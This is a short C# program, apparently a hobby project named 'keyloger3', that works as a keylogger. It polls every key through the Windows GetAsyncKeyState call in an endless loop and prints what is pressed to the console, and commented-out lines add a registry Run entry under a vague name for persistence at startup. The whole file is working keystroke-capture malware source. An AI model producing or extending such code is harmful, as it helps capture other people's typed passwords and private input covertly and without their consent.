using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


namespace keyloger3
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        static void Main(string[] args)
        {
           // RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

           // reg.SetValue("A_P_K_A", @"");

            while (true)
            {
                Thread.Sleep(60);

                for (int i = 0; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState != 0)
                    {


                        if (i == 20)
                        {
                            Console.Write("capslock");
                        }

                        if (i == 9)
                        {
                            Console.Write("tab");
                        }

                        if (i == 16)
                        {
                            Console.Write("shift");
                        }

                        if (i == 17)
                        {
                            Console.Write("ctrl");
                        }

                        if (i == 8)
                        {
                            Console.Write( "backspace");
                        }

                        if (i == 18)
                        {
                            Console.Write("alt");
                        }

                        if (keyState == 91)
                        {
                            Console.Write("windows");
                        }
                        
                       
                            Console.Write((char)i + ",");
                        
                    }
                }

            }
        }
    }
}
